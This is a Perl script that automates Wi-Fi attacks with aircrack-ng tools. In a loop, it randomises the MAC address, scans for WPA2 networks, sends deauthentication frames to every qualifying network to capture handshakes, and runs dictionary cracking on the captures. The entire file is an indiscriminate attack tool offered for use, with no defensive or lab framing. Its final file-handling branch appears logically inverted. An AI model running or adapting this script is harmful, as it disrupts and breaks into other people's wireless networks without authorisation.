#!/usr/bin/env perl

use Proc::Background;
use File::Copy;
#requires apt-get install libproc-background-perl
#and maybe apt-get install libproc-simple-perl

my $interface = shift || "wlan0";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $airodump	= "airodump-ng";
my $aircrack = "aircrack-ng";
my $ifconfig	= "ifconfig";
my $macchanger	= "macchanger";
my $apdir = "/rootdir/apdir/";
my $tempdir = "/rootdir/tmp/";
my $capdir = "/rootdir/capdir/";
my $wordlist = "/rootdir/a.lst";

while (true){
system($ifconfig, $interface, "down");
system($macchanger, "-r", $interface);
system($ifconfig, $interface, "up");
system($airmon, "start", $interface);

($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
$apid = join("",$apdir,$yday,"-",$hour,"-",$min,"-",$sec);

my $proc0 = Proc::Background->new($airodump, "--output-format", "csv", "-w", "$apid", "mon0");
$proc0->alive;
sleep(10);
$proc0->die;
$proc0->wait;
$proc0 = undef;

my @data;
open(my $fh1, '<', "$apid-01.csv") or die "Can't read file '$apid-01.csv' [$!]\n";
while (my $line = <$fh1>) {
chomp $line;
my @fields = split(/,/, $line);
push @data, \@fields;
}
close $fh1;

foreach my $rowline (@data)
{ 
my $ssid = $rowline->[13];
my $privacy = $rowline->[5];
my $bssid = $rowline->[0];
my $channel = $rowline->[3];

$ssid = substr($ssid, 1);
$privacy = substr($privacy, 1);
$channel =~ s/ //g;
 
if ($privacy eq "WPA2") {
if ($bssid =~ /^[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}:[A-Fa-f0-9]{2}$/) {
if ($ssid =~ /^[\w\ ]{1,30}$/) {
$cappath = join('', $capdir,$ssid);
$temppath = join('', $tempdir,$ssid);
unless (-e "$cappath-01.cap") {
my $proc1 = Proc::Background->new($airodump, "--bssid", "$bssid", "--channel", "$channel", "--output-format", "cap", "-w", "$temppath", "mon0");
my $proc2 = Proc::Background->new($aireplay, "--deauth", "10", "-a", "$bssid", "mon0", "--ignore-negative-one");

$proc1->alive;
$proc2->alive;
sleep(10);
$proc1->die;
$proc2->die;
$proc1->wait;
$proc2->wait;
$proc1 = undef;
$proc2 = undef;
}
}
}
}
}

system($airmon, "stop", "mon0");

@files = <$tempdir*.cap>;
foreach $file (@files) {
$result = `$aircrack "$file" -w $wordlist`;
if (not $result =~ m/Passphrase not in dictionary/) {
unlink "$file"
} else {
move("$file", "$capdir");
}
}
}